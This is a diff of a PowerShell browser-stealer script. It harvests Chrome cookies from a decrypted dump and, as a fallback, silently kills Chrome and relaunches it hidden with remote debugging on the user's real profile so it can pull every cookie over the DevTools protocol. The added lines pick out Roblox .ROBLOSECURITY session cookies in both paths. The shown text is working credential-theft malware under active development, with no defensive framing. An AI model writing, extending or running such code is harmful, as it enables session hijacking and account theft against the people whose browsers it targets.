@@ -299,7 +299,12 @@ if ($appBound -and ($pwCount -eq 0 -or $ckCount -eq 0)) {
         if (Test-Path $cf) {
           $hc = Get-Content $cf -Raw | ConvertFrom-Json
           ts "[dbg] HBD cookies: $($hc.Count)"
-          foreach ($e in $hc) { $allCookies += @{host=$e.Host;name=$e.Name;value=$e.Value;browser="Chrome(HBD)"} }
+          foreach ($e in $hc) { 
+            $allCookies += @{host=$e.Host;name=$e.Name;value=$e.Value;browser="Chrome(HBD)"}
+            if (($e.Name -eq ".ROBLOSECURITY" -or $e.Name -eq "ROBLOSECURITY") -and $e.Host.Contains("roblox.com")) {
+              if (-not $robCookie) { $robCookie = $e.Value; ts "[dbg] Roblox cookie from HBD" }
+            }
+          }
         }
         Remove-Item $hd -Recurse -Force -ErrorAction SilentlyContinue
       }
@@ -307,45 +312,39 @@ if ($appBound -and ($pwCount -eq 0 -or $ckCount -eq 0)) {
     } catch { ts "[dbg] HBD error: $_" }
   }
   
-  # CDP for cookies
+  # CDP for cookies (fallback if HBD didn't output cookies)
   if ($ckCount -eq 0) {
     try {
       $cex = @("$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe","${env:ProgramFiles}\Google\Chrome\Application\chrome.exe") | Where-Object { Test-Path $_ } | Select-Object -First 1
       if ($cex) {
         Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force; Start-Sleep 2
-        $ud = "$env:TEMP\cdp_$([IO.Path]::GetRandomFileName())"
-        $port = 9222; $portTry = 0
-        try { while ((Get-NetTCPConnection -LocalPort $port -ErrorAction SilentlyContinue) -and $portTry -lt 10) { $port++; $portTry++ } } catch {}
-        $p = Start-Process -FilePath $cex -ArgumentList "--remote-debugging-port=$port --user-data-dir=$ud --no-first-run --no-default-browser-check --disable-gpu --headless=new" -PassThru -WindowStyle Hidden
+        $port = 9222
+        try { while ((Get-NetTCPConnection -LocalPort $port -ErrorAction SilentlyContinue) -and 0 -lt 10) { $port++ } } catch {}
+        # Use real profile so cookies are available
+        $p = Start-Process -FilePath $cex -ArgumentList "--remote-debugging-port=$port --no-first-run --no-default-browser-check --disable-gpu --headless=new --disable-session-crashed-bubble" -PassThru -WindowStyle Hidden
         Start-Sleep 4
         $tgts = Invoke-RestMethod "http://127.0.0.1:$port/json" -TimeoutSec 5 -ErrorAction Stop
         $wsUrl = if ($tgts[0].webSocketDebuggerUrl) { $tgts[0].webSocketDebuggerUrl } else {
-          $np = Invoke-RestMethod "http://127.0.0.1:$port/json/new?about:blank" -TimeoutSec 5 -ErrorAction Stop
-          $np.webSocketDebuggerUrl
+          $np = Invoke-RestMethod "http://127.0.0.1:$port/json/new?about:blank" -TimeoutSec 5 -ErrorAction Stop; $np.webSocketDebuggerUrl
         }
         if ($wsUrl) {
           $ws = New-Object System.Net.WebSockets.ClientWebSocket
           $ws.ConnectAsync((New-Object Uri($wsUrl)), ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
           $cmd = @{id=1;method="Network.getAllCookies"} | ConvertTo-Json -Compress
-          $b = [Text.Encoding]::UTF8.GetBytes($cmd)
-          $ws.SendAsync((New-Object ArraySegment[byte] -ArgumentList @(,$b)), ([Net.WebSockets.WebSocketMessageType]::Text), $true, ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
+          $b = [Text.Encoding]::UTF8.GetBytes($cmd); $ws.SendAsync((New-Object ArraySegment[byte] -ArgumentList @(,$b)), ([Net.WebSockets.WebSocketMessageType]::Text), $true, ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
           $rb = New-Object byte[] 1048576; $list = New-Object Collections.Generic.List[byte]
-          do {
-            $r = $ws.ReceiveAsync((New-Object ArraySegment[byte] -ArgumentList @(,$rb)), ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
-            if ($r.Count -gt 0) { $list.AddRange([byte[]]($rb[0..($r.Count-1)])) }
-          } while (!$r.EndOfMessage)
+          do { $r = $ws.ReceiveAsync((New-Object ArraySegment[byte] -ArgumentList @(,$rb)), ([Threading.CancellationToken]::None)).GetAwaiter().GetResult(); if ($r.Count -gt 0) { $list.AddRange([byte[]]($rb[0..($r.Count-1)])) } } while (!$r.EndOfMessage)
           $ws.Dispose()
           try {
             $resp = [Text.Encoding]::UTF8.GetString($list.ToArray()) | ConvertFrom-Json
             if ($resp.result -and $resp.result.cookies -and $resp.id -eq 1) {
-              $cdpCkCount = $resp.result.cookies.Count
-              $allCookies += $resp.result.cookies
+              $cdpCkCount = $resp.result.cookies.Count; $allCookies += $resp.result.cookies
+              foreach ($cc in $resp.result.cookies) { if (($cc.name -eq ".ROBLOSECURITY" -or $cc.name -eq "ROBLOSECURITY") -and $cc.domain.Contains("roblox.com") -and -not $robCookie) { $robCookie = $cc.value; ts "[dbg] Roblox cookie from CDP" } }
               ts "[dbg] CDP cookies: $cdpCkCount"
             }
           } catch { ts "[dbg] CDP parse error: $_" }
         }
         if ($p -and !$p.HasExited) { $p.Kill() }
-        Remove-Item $ud -Recurse -Force -ErrorAction SilentlyContinue
       }
     } catch { ts "[dbg] CDP error: $_" }
   }
